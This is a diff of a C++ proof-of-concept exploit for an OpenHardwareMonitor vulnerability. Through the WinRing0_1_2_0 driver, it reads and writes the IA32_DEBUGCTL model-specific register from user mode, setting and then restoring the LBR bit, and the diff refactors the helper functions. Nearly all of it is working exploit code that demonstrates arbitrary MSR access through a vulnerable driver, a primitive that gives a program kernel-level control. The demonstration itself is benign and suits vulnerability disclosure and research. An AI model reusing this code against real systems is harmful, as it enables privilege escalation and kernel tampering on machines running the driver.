@@ -1,103 +1,102 @@
 #include <windows.h>
 #include <iostream>
 
-#include "openhardwaremonitor_defs.h"
+#include "openhardwaremonitor.h"
 
-bool ReadMsr( HANDLE hDevice, unsigned long index, unsigned __int64* pOutput )
-{
-	DWORD Returned { };
-	return hDevice != nullptr && DeviceIoControl( hDevice, READ_MSR_IOCTL, &index, sizeof( index ),
-												  pOutput, sizeof( *pOutput ), &Returned, nullptr );
-}
-
-bool WriteMsr( HANDLE hDevice, unsigned long index, unsigned __int64 value )
-{
-	WRITE_MSR_STRUCT wMsr { };
-	wMsr.IdMSR = index;
-	wMsr.ValueMSR = value;
-
-	DWORD Returned { };
-	return hDevice != nullptr && DeviceIoControl( hDevice, WRITE_MSR_IOCTL, &wMsr, sizeof( wMsr ),
-												  nullptr, NULL, &Returned, nullptr );
-}
+#define IA32_DEBUGCTL 0x1D9
 
 int main( )
 {
-	printf( "\n\tOpenHardwareMonitor R/W Msr Vulnerability PoC\n\n[+] Setting Process Affinity Mask to 1 Core\n" );
+	printf( "\n\tOpenHardwareMonitor R/W Msr Vulnerability PoC\n\n" );
+	printf( "[+] Setting Process Affinity Mask to 1 Core\n" );
 	
 	if ( !SetProcessAffinityMask( GetCurrentProcess( ), 1 << 1 ) )
 	{
 		printf( "[!] Error Setting Process Affinity Mask!\n" );
+
 		system( "pause>nul" );
 		return 1;
 	}
 
 	printf( "[+] Opening Device Handle\n" );
 
-	auto hDevice = CreateFileA( "\\\\.\\WinRing0_1_2_0", GENERIC_READ | GENERIC_WRITE, NULL, nullptr,
+	auto h_device = CreateFileA( "\\\\.\\WinRing0_1_2_0", GENERIC_READ | GENERIC_WRITE, NULL, nullptr,
 								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
-	if ( !hDevice )
+	if ( !h_device )
 	{
 		printf( "[!] Error Opening Device Handle, Probably the Driver isnt Loaded!\n" );
+		
 		system( "pause>nul" );
 		return 1;
 	}
 
 	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );
 
-	unsigned __int64 backup { };
-	if ( !ReadMsr( hDevice, 0x1D9, &backup ) )
+	unsigned long long first_debugctl_msr_value;
+	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &first_debugctl_msr_value ) )
 	{
 		printf( "[!] Error While Reading Msr!\n" );
-		CloseHandle( hDevice );
+
+		CloseHandle( h_device );
+
 		system( "pause>nul" );
 		return 1;
 	}
 
-	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Setting LBR bit\n", backup );
+	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Setting LBR bit\n", first_debugctl_msr_value );
 
-	if ( !WriteMsr( hDevice, 0x1D9, backup | 0b1 ) )
+	if ( !ohm::write_msr( h_device, IA32_DEBUGCTL, first_debugctl_msr_value | 0b1 ) )
 	{
 		printf( "[!] Error While Writing Msr!\n" );
-		CloseHandle( hDevice );
+
+		CloseHandle( h_device );
+
 		system( "pause>nul" );
 		return 1;
 	}
 	
 	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );
 
-	unsigned __int64 newValue { };
-	if ( !ReadMsr( hDevice, 0x1D9, &newValue ) )
+	unsigned long long second_debugctl_msr_value;
+	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &second_debugctl_msr_value ) )
 	{
 		printf( "[!] Error While Reading Msr!\n" );
-		CloseHandle( hDevice );
+
+		CloseHandle( h_device );
+
 		system( "pause>nul" );
 		return 1;
 	}
 
-	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Removing LBR bit\n", newValue );
+	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n[+] Removing LBR bit\n", second_debugctl_msr_value );
 
-	if ( !WriteMsr( hDevice, 0x1D9, backup ) )
+	if ( !ohm::write_msr( h_device, IA32_DEBUGCTL, first_debugctl_msr_value ) )
 	{
 		printf( "[!] Error While Writing Msr!\n" );
-		CloseHandle( hDevice );
+
+		CloseHandle( h_device );
+
 		system( "pause>nul" );
 		return 1;
 	}
 
 	printf( "[+] Reading IA32_DEBUGCTL Msr\n" );
 
-	if ( !ReadMsr( hDevice, 0x1D9, &newValue ) )
+	unsigned long long third_debugctl_msr_value;
+	if ( !ohm::read_msr( h_device, IA32_DEBUGCTL, &third_debugctl_msr_value ) )
 	{
 		printf( "[!] Error While Reading Msr!\n" );
-		CloseHandle( hDevice );
+
+		CloseHandle( h_device );
+
 		system( "pause>nul" );
 		return 1;
 	}
 
-	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n", newValue );
+	printf( "[+] IA32_DEBUGCTL Msr Value: 0x%X\n", third_debugctl_msr_value );
 
-	CloseHandle( hDevice );
+	CloseHandle( h_device );
+
 	system( "pause>nul" );
 	return 0;
 }
